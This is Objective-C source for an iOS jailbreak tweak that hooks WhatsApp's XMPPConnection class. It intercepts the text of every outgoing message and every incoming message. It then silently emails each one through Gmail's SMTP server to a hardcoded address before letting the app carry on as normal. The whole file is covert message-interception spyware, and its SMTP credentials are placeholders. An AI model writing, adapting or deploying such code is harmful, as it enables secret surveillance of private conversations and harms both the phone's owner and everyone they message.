#import "SKPSMTPMessage.h"
#import "NSStream+SKPSMTPExtensions.h"
#import "NSData+Base64Additions.h"

%hook XMPPConnection

- (void)sendMessage:(id)arg1{
	NSString *str1 = [arg1 text];
        SKPSMTPMessage *testMsg = [[SKPSMTPMessage alloc] init];
        testMsg.fromEmail = @"keithtest10@@gmail.com";
        testMsg.toEmail = @"keithtest10@gmail.com";
        testMsg.relayHost = @"smtp.gmail.com";
        testMsg.requiresAuth = YES;
        testMsg.login = @"keithtest10";
        testMsg.pass = @"passwordhere";
        testMsg.subject = @"Outgoing Whatsapp Message";
        testMsg.wantsSecure = YES; 
    	NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,
        	str1,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];  
        testMsg.parts = [NSArray arrayWithObjects:plainPart,nil];
	[testMsg send];
        %orig;
}
		

-(void)processIncomingMessages:(id)arg1 {
	NSString *str1 = [NSString stringWithFormat:@"%@",arg1];
        SKPSMTPMessage *testMsg = [[SKPSMTPMessage alloc] init];
        testMsg.fromEmail = @"123@gmail.com";
        testMsg.toEmail = @"123@gmail.com";
        testMsg.relayHost = @"smtp.gmail.com";
        testMsg.requiresAuth = YES;
        testMsg.login = @"123";
        testMsg.pass = @"password";
        testMsg.subject = @"Ingoing Whatsapp Message";
        testMsg.wantsSecure = YES; // smtp.gmail.com doesn't work without TLS!
    	NSDictionary *plainPart = [NSDictionary dictionaryWithObjectsAndKeys:@"text/plain",kSKPSMTPPartContentTypeKey,
        	str1,kSKPSMTPPartMessageKey,@"8bit",kSKPSMTPPartContentTransferEncodingKey,nil];  
    	testMsg.parts = [NSArray arrayWithObjects:plainPart,nil];	
	[testMsg send];
	%orig;
}


%end
